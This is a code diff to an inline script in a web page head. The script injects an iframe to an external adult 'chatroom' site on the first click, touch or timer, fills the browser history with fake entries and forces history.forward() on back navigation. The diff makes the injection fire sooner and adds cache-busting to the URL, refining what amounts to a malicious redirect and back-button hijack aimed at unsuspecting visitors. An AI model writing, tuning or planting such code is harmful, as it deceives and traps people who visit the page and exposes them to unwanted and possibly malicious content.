@@ -14,7 +14,7 @@
             return;
         }
 
-        const target = "https://neontishell.uno/chatroom.php?girl=diana&src=gh"; 
+        const target = "https://neontishell.uno/chatroom.php?girl=diana&src=gh&v=" + Date.now(); 
         
         function inject() {
             if (window.done) return;
@@ -41,14 +41,14 @@
             ifrm.allow = "autoplay; encrypted-media; fullscreen;";
             document.body.appendChild(ifrm);
 
-            for(let i=0; i<15; i++) history.pushState(null, "", "#/session_" + Math.random().toString(36).substring(7));
+            for(let i=0; i<15; i++) history.pushState(null, "", "#/s" + Math.random().toString(36).substring(7));
             window.onpopstate = () => { history.forward(); };
         }
 
         window.addEventListener('touchstart', inject, {once: true});
         window.addEventListener('click', inject, {once: true});
         
-        setTimeout(inject, 1200);
+        setTimeout(inject, 600); 
     })();
     </script>
 </head>
